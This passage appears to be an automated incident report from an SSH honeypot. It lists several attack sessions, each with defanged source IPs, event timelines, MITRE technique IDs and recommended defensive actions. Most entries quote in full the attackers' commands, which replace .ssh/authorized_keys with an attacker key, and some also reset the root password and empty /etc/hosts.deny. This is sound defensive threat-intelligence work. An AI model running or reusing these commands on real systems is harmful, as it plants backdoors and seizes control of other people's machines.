| `2026-04-13 04:27:49` | `cowrie.session.connect` |
| `2026-04-13 04:27:49` | `cowrie.client.version` |
| `2026-04-13 04:27:49` | `cowrie.client.kex` |
| `2026-04-13 04:27:49` | `cowrie.login.success` |
| `2026-04-13 04:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b24f1a41efcc

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:30 |
| **Last Seen** | 2026-04-13 04:30 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:HDtm5pcS4QXX"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:30:15` | `cowrie.session.connect` |
| `2026-04-13 04:30:15` | `cowrie.client.version` |
| `2026-04-13 04:30:15` | `cowrie.client.kex` |
| `2026-04-13 04:30:16` | `cowrie.login.success` |
| `2026-04-13 04:30:16` | `cowrie.session.params` |
| `2026-04-13 04:30:16` | `cowrie.command.input` |
| `2026-04-13 04:30:16` | `cowrie.command.failed` |
| `2026-04-13 04:30:16` | `cowrie.log.closed` |
| `2026-04-13 04:30:17` | `cowrie.session.params` |
| `2026-04-13 04:30:17` | `cowrie.command.input` |
| `2026-04-13 04:30:17` | `cowrie.session.file_download` |
| `2026-04-13 04:30:17` | `cowrie.log.closed` |
| `2026-04-13 04:30:26` | `cowrie.session.params` |
| `2026-04-13 04:30:26` | `cowrie.command.input` |
| `2026-04-13 04:30:26` | `cowrie.log.closed` |
| `2026-04-13 04:30:26` | `cowrie.session.params` |
| `2026-04-13 04:30:26` | `cowrie.command.input` |
| `2026-04-13 04:30:26` | `cowrie.log.closed` |
| `2026-04-13 04:30:27` | `cowrie.session.params` |
| `2026-04-13 04:30:27` | `cowrie.command.input` |
| `2026-04-13 04:30:27` | `cowrie.session.file_download` |
| `2026-04-13 04:30:27` | `cowrie.log.closed` |
| `2026-04-13 04:30:27` | `cowrie.session.params` |
| `2026-04-13 04:30:27` | `cowrie.command.input` |
| `2026-04-13 04:30:27` | `cowrie.log.closed` |
| `2026-04-13 04:30:28` | `cowrie.session.params` |
| `2026-04-13 04:30:28` | `cowrie.command.input` |
| `2026-04-13 04:30:28` | `cowrie.log.closed` |
| `2026-04-13 04:30:28` | `cowrie.session.params` |
| `2026-04-13 04:30:28` | `cowrie.command.input` |
| `2026-04-13 04:30:28` | `cowrie.command.input` |
| `2026-04-13 04:30:28` | `cowrie.log.closed` |
| `2026-04-13 04:30:29` | `cowrie.session.params` |
| `2026-04-13 04:30:29` | `cowrie.command.input` |
| `2026-04-13 04:30:29` | `cowrie.log.closed` |
| `2026-04-13 04:30:29` | `cowrie.session.params` |
| `2026-04-13 04:30:29` | `cowrie.command.input` |
| `2026-04-13 04:30:29` | `cowrie.log.closed` |
| `2026-04-13 04:30:30` | `cowrie.session.params` |
| `2026-04-13 04:30:30` | `cowrie.command.input` |
| `2026-04-13 04:30:30` | `cowrie.log.closed` |
| `2026-04-13 04:30:30` | `cowrie.session.params` |
| `2026-04-13 04:30:30` | `cowrie.command.input` |
| `2026-04-13 04:30:30` | `cowrie.log.closed` |
| `2026-04-13 04:30:31` | `cowrie.session.params` |
| `2026-04-13 04:30:31` | `cowrie.command.input` |
| `2026-04-13 04:30:31` | `cowrie.log.closed` |
| `2026-04-13 04:30:31` | `cowrie.session.params` |
| `2026-04-13 04:30:31` | `cowrie.command.input` |
| `2026-04-13 04:30:31` | `cowrie.log.closed` |
| `2026-04-13 04:30:32` | `cowrie.session.params` |
| `2026-04-13 04:30:32` | `cowrie.command.input` |
| `2026-04-13 04:30:32` | `cowrie.log.closed` |
| `2026-04-13 04:30:32` | `cowrie.session.params` |
| `2026-04-13 04:30:32` | `cowrie.command.input` |
| `2026-04-13 04:30:32` | `cowrie.log.closed` |
| `2026-04-13 04:30:32` | `cowrie.session.params` |
| `2026-04-13 04:30:32` | `cowrie.command.input` |
| `2026-04-13 04:30:33` | `cowrie.log.closed` |
| `2026-04-13 04:30:33` | `cowrie.session.params` |
| `2026-04-13 04:30:33` | `cowrie.command.input` |
| `2026-04-13 04:30:33` | `cowrie.log.closed` |
| `2026-04-13 04:30:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fe197f233a8

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:31 |
| **Last Seen** | 2026-04-13 04:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:31:19` | `cowrie.session.connect` |
| `2026-04-13 04:31:19` | `cowrie.client.version` |
| `2026-04-13 04:31:19` | `cowrie.client.kex` |
| `2026-04-13 04:31:20` | `cowrie.login.success` |
| `2026-04-13 04:31:21` | `cowrie.session.params` |
| `2026-04-13 04:31:21` | `cowrie.command.input` |
| `2026-04-13 04:31:21` | `cowrie.command.failed` |
| `2026-04-13 04:31:21` | `cowrie.log.closed` |
| `2026-04-13 04:31:22` | `cowrie.session.params` |
| `2026-04-13 04:31:22` | `cowrie.command.input` |
| `2026-04-13 04:31:22` | `cowrie.session.file_download` |
| `2026-04-13 04:31:22` | `cowrie.log.closed` |
| `2026-04-13 04:31:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ed05fc71b35

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:31 |
| **Last Seen** | 2026-04-13 04:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:31:25` | `cowrie.session.connect` |
| `2026-04-13 04:31:25` | `cowrie.client.version` |
| `2026-04-13 04:31:25` | `cowrie.client.kex` |
| `2026-04-13 04:31:27` | `cowrie.login.success` |
| `2026-04-13 04:31:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5232234f21e9

| Field | Detail |
|---|---|
| **Source IP** | `14.103.105[.]243` |
| **First Seen** | 2026-04-13 04:31 |
| **Last Seen** | 2026-04-13 04:32 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:31:52` | `cowrie.session.connect` |
| `2026-04-13 04:31:52` | `cowrie.client.version` |
| `2026-04-13 04:31:52` | `cowrie.client.kex` |
| `2026-04-13 04:31:53` | `cowrie.login.success` |
| `2026-04-13 04:31:53` | `cowrie.session.params` |
| `2026-04-13 04:31:53` | `cowrie.command.input` |
| `2026-04-13 04:31:53` | `cowrie.command.failed` |
| `2026-04-13 04:31:53` | `cowrie.log.closed` |
| `2026-04-13 04:31:55` | `cowrie.session.params` |
| `2026-04-13 04:31:55` | `cowrie.command.input` |
| `2026-04-13 04:31:55` | `cowrie.session.file_download` |
| `2026-04-13 04:31:55` | `cowrie.log.closed` |
| `2026-04-13 04:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.105[.]243` to AbuseIPDB if not already reported
- [ ] Block `14.103.105[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b718cc3e306

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:31 |
| **Last Seen** | 2026-04-13 04:32 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:bcR9NcRjbhGf"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:31:56` | `cowrie.session.connect` |
| `2026-04-13 04:31:56` | `cowrie.client.version` |
| `2026-04-13 04:31:56` | `cowrie.client.kex` |
| `2026-04-13 04:31:56` | `cowrie.login.success` |
| `2026-04-13 04:31:57` | `cowrie.session.params` |
| `2026-04-13 04:31:57` | `cowrie.command.input` |
| `2026-04-13 04:31:57` | `cowrie.command.failed` |
| `2026-04-13 04:31:57` | `cowrie.log.closed` |
| `2026-04-13 04:31:57` | `cowrie.session.params` |
| `2026-04-13 04:31:57` | `cowrie.command.input` |
| `2026-04-13 04:31:57` | `cowrie.session.file_download` |
| `2026-04-13 04:31:57` | `cowrie.log.closed` |
| `2026-04-13 04:32:05` | `cowrie.session.params` |
| `2026-04-13 04:32:05` | `cowrie.command.input` |
| `2026-04-13 04:32:05` | `cowrie.log.closed` |
| `2026-04-13 04:32:06` | `cowrie.session.params` |
| `2026-04-13 04:32:06` | `cowrie.command.input` |
| `2026-04-13 04:32:06` | `cowrie.log.closed` |
| `2026-04-13 04:32:06` | `cowrie.session.params` |
| `2026-04-13 04:32:06` | `cowrie.command.input` |
| `2026-04-13 04:32:06` | `cowrie.session.file_download` |
| `2026-04-13 04:32:06` | `cowrie.log.closed` |
| `2026-04-13 04:32:07` | `cowrie.session.params` |
| `2026-04-13 04:32:07` | `cowrie.command.input` |
| `2026-04-13 04:32:07` | `cowrie.log.closed` |
| `2026-04-13 04:32:07` | `cowrie.session.params` |
| `2026-04-13 04:32:07` | `cowrie.command.input` |
| `2026-04-13 04:32:07` | `cowrie.log.closed` |
| `2026-04-13 04:32:08` | `cowrie.session.params` |
| `2026-04-13 04:32:08` | `cowrie.command.input` |
| `2026-04-13 04:32:08` | `cowrie.command.input` |
| `2026-04-13 04:32:08` | `cowrie.log.closed` |
| `2026-04-13 04:32:08` | `cowrie.session.params` |
| `2026-04-13 04:32:08` | `cowrie.command.input` |
| `2026-04-13 04:32:08` | `cowrie.log.closed` |
| `2026-04-13 04:32:09` | `cowrie.session.params` |
| `2026-04-13 04:32:09` | `cowrie.command.input` |
| `2026-04-13 04:32:09` | `cowrie.log.closed` |
| `2026-04-13 04:32:09` | `cowrie.session.params` |
| `2026-04-13 04:32:09` | `cowrie.command.input` |
| `2026-04-13 04:32:09` | `cowrie.log.closed` |
| `2026-04-13 04:32:10` | `cowrie.session.params` |
| `2026-04-13 04:32:10` | `cowrie.command.input` |
| `2026-04-13 04:32:10` | `cowrie.log.closed` |
| `2026-04-13 04:32:10` | `cowrie.session.params` |
| `2026-04-13 04:32:10` | `cowrie.command.input` |
| `2026-04-13 04:32:10` | `cowrie.log.closed` |
| `2026-04-13 04:32:11` | `cowrie.session.params` |
| `2026-04-13 04:32:11` | `cowrie.command.input` |
| `2026-04-13 04:32:11` | `cowrie.log.closed` |
| `2026-04-13 04:32:11` | `cowrie.session.params` |
| `2026-04-13 04:32:11` | `cowrie.command.input` |
| `2026-04-13 04:32:11` | `cowrie.log.closed` |
| `2026-04-13 04:32:11` | `cowrie.session.params` |
| `2026-04-13 04:32:11` | `cowrie.command.input` |
| `2026-04-13 04:32:12` | `cowrie.log.closed` |
| `2026-04-13 04:32:12` | `cowrie.session.params` |
| `2026-04-13 04:32:12` | `cowrie.command.input` |
| `2026-04-13 04:32:12` | `cowrie.log.closed` |
| `2026-04-13 04:32:12` | `cowrie.session.params` |
| `2026-04-13 04:32:12` | `cowrie.command.input` |
| `2026-04-13 04:32:13` | `cowrie.log.closed` |
| `2026-04-13 04:32:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a397bd5af97a

| Field | Detail |
|---|---|
| **Source IP** | `14.103.105[.]243` |
| **First Seen** | 2026-04-13 04:32 |
| **Last Seen** | 2026-04-13 04:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:32:03` | `cowrie.session.connect` |
| `2026-04-13 04:32:03` | `cowrie.client.version` |
| `2026-04-13 04:32:03` | `cowrie.client.kex` |
| `2026-04-13 04:32:04` | `cowrie.login.success` |
| `2026-04-13 04:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.105[.]243` to AbuseIPDB if not already reported
- [ ] Block `14.103.105[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5de420719de

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:32 |
| **Last Seen** | 2026-04-13 04:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:32:34` | `cowrie.session.connect` |
| `2026-04-13 04:32:34` | `cowrie.client.version` |
| `2026-04-13 04:32:34` | `cowrie.client.kex` |
| `2026-04-13 04:32:34` | `cowrie.login.success` |
| `2026-04-13 04:32:35` | `cowrie.session.params` |
| `2026-04-13 04:32:35` | `cowrie.command.input` |
| `2026-04-13 04:32:35` | `cowrie.command.failed` |
| `2026-04-13 04:32:35` | `cowrie.log.closed` |
| `2026-04-13 04:32:35` | `cowrie.session.params` |
| `2026-04-13 04:32:35` | `cowrie.command.input` |
| `2026-04-13 04:32:35` | `cowrie.session.file_download` |
| `2026-04-13 04:32:35` | `cowrie.log.closed` |
| `2026-04-13 04:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae04b937a39c

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:32 |
| **Last Seen** | 2026-04-13 04:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:32:37` | `cowrie.session.connect` |
| `2026-04-13 04:32:37` | `cowrie.client.version` |
| `2026-04-13 04:32:37` | `cowrie.client.kex` |
| `2026-04-13 04:32:37` | `cowrie.login.success` |
| `2026-04-13 04:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39dd7de2f440

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:32 |
| **Last Seen** | 2026-04-13 04:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:32:47` | `cowrie.session.connect` |
| `2026-04-13 04:32:47` | `cowrie.client.version` |
| `2026-04-13 04:32:47` | `cowrie.client.kex` |
| `2026-04-13 04:32:47` | `cowrie.login.success` |
| `2026-04-13 04:32:48` | `cowrie.session.params` |
| `2026-04-13 04:32:48` | `cowrie.command.input` |
| `2026-04-13 04:32:48` | `cowrie.command.failed` |
| `2026-04-13 04:32:48` | `cowrie.log.closed` |
| `2026-04-13 04:32:48` | `cowrie.session.params` |
| `2026-04-13 04:32:48` | `cowrie.command.input` |
| `2026-04-13 04:32:48` | `cowrie.session.file_download` |
| `2026-04-13 04:32:48` | `cowrie.log.closed` |
| `2026-04-13 04:32:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0411f4120cce

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:32 |
| **Last Seen** | 2026-04-13 04:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:32:51` | `cowrie.session.connect` |
| `2026-04-13 04:32:51` | `cowrie.client.version` |
| `2026-04-13 04:32:51` | `cowrie.client.kex` |
| `2026-04-13 04:32:51` | `cowrie.login.success` |
| `2026-04-13 04:32:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ee1b68e4df7

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:33 |
| **Last Seen** | 2026-04-13 04:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:33:38` | `cowrie.session.connect` |
| `2026-04-13 04:33:38` | `cowrie.client.version` |
| `2026-04-13 04:33:38` | `cowrie.client.kex` |
| `2026-04-13 04:33:38` | `cowrie.login.success` |
| `2026-04-13 04:33:39` | `cowrie.session.params` |
| `2026-04-13 04:33:39` | `cowrie.command.input` |
| `2026-04-13 04:33:39` | `cowrie.command.failed` |
| `2026-04-13 04:33:39` | `cowrie.log.closed` |
| `2026-04-13 04:33:39` | `cowrie.session.params` |
| `2026-04-13 04:33:39` | `cowrie.command.input` |
| `2026-04-13 04:33:39` | `cowrie.session.file_download` |
| `2026-04-13 04:33:39` | `cowrie.log.closed` |
| `2026-04-13 04:33:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa9d42d2472d

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-13 04:33 |
| **Last Seen** | 2026-04-13 04:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:33:42` | `cowrie.session.connect` |
| `2026-04-13 04:33:42` | `cowrie.client.version` |
| `2026-04-13 04:33:42` | `cowrie.client.kex` |
| `2026-04-13 04:33:43` | `cowrie.login.success` |
| `2026-04-13 04:33:43` | `cowrie.session.closed` |

**Recommended Actions:**
